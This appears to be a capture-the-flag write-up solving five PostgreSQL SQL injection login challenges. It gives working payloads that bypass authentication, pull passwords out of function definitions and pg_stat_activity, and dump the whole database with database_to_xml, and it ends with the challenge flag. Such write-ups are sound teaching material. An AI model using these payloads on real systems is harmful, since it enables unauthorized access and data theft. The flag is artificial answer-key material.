We need to find 5 SQL injections to get the flag.
I used this playground: https://onecompiler.com/postgresql
# Admin
Admin was simple, same as Admin 1-2:
`' OR '1'='1` worked.

# Super Admin
We can select the function code, use substring to get only the password from the function code, and then concat it to the function.

```sql
' || ( SELECT SUBSTRING(pg_get_functiondef((SELECT oid FROM pg_proc    WHERE proname = 'check_password')), 178,32))) --
```
# Hyper Admin
We can get the query in memory, get our running query, and extract the password from there
```sql
' || substring( (SELECT query FROM pg_stat_activity where query != '' limit 1 offset 2), 9, 32) || '
```

# Turbo admin
The code don't actually check if one line is equal to the password, it instead check if both columns are equal. We just have to use a union with 2 same cols.
```sql
' UNION SELECT '1', '1' LIMIT 1-- -
```

# Flag

First i tried this:
```sql
SELECT table_name FROM information_schema.tables WHERE table_name LIKE 'table_%' LIMIT 1;
SELECT column_name FROM information_schema.columns WHERE table_name LIKE 'table_%' AND column_name LIKE 'col_%';
```

But you can't use table names dynamically.

So i used this payload:
```sql
' || SUBSTRING('' || database_to_xml(true,true,''), 168, 32) -- -
```

This is dumping the database to xml, and the retrieving our token.

I found the offset (168) by using Burp Intruder, and by iterating over all values.

And flagged :)
`FCSC{a380e590ae8ffe8da9bb86f27d05203b7f9d32dd37c833c2764097840848b3a2}`

